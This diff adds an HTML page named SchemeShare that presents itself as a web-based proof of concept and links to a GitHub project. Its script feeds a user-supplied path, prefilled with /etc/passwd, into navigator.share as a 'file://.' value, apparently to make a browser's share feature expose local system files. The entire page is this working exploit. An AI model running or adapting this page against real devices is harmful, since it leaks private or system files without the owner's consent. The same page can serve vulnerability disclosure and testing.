@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SchemeShare</title>
+  <style>
+    body {
+      align-items: center;
+      background: #232323;
+      color: #f4f4f4;
+      display: flex;
+      font-family: Helvetica, sans-serif;
+      font-size: 16px;
+      height: 100dvh;
+      justify-content: center;
+      margin: 0;
+    }
+
+    main {
+      margin: 4rem;
+      text-align: center;
+    }
+
+    h1 {
+      font-weight: 100;
+    }
+
+    a {
+      color: #5f5f5f;
+      transition: color 0.2s ease-in;
+    }
+
+    a:hover {
+      color: #f4f4f4;
+    }
+
+    p {
+      color: #b4b4b4;
+      font-size: 1.25rem;
+    }
+
+    button, input {
+      background-color: #f4f4f4;
+      border: none;
+      color: #232323;
+      font-size: 1rem;
+      padding: 10px 20px;
+    }
+
+    input {
+      border-radius: 5px 0 0 5px;
+      box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.6);
+      max-width: 240px;
+    }
+
+    button {
+      cursor: pointer;;
+      border-radius: 0 5px 5px 0;
+      background: rgba(22, 22, 22, 0.6);
+      color: rgb(209, 209, 209)
+    }
+
+    p.error {
+      background-color: #f0294e;
+      color: #f4f4f4;
+    }
+    
+    form {
+      display: flex;
+      flex: 1;
+      justify-content: center;
+    }
+
+    p {
+      font-size: 1rem;
+    }
+  </style>
+</head>
+
+<body>
+  <main>
+    <h1>SchemeShare</h1>
+    <p>Web based poc for <a href="https://github.com/34306/schemeshare">https://github.com/34306/schemeshare</a></p>
+    <form>
+      <input value="/etc/passwd" id="path">
+      <button type="button" id="trigger">Share</button>
+    </form>
+    <p id="result">Ready</p>
+  </main>
+
+  <script type="text/javascript">  
+    /**
+     * @type {HTMLButtonElement}
+     */
+    const button = document.getElementById("trigger");
+    const result = document.getElementById("result");
+
+    button.addEventListener("click", async () => {
+      const path = document.getElementById("path").value;
+      const shareData = {
+        text: `file://.${path}`,
+      };
+
+      try {
+        result.classList.remove('error');
+        result.textContent = 'Waiting for confirmation';
+        await navigator.share(shareData);
+        result.textContent = 'OK';
+      } catch (err) {
+        result.classList.add('error');
+        result.textContent = `Error: ${err}`;
+      }
+    });
+  
+  </script>
+</body>
+
+</html>
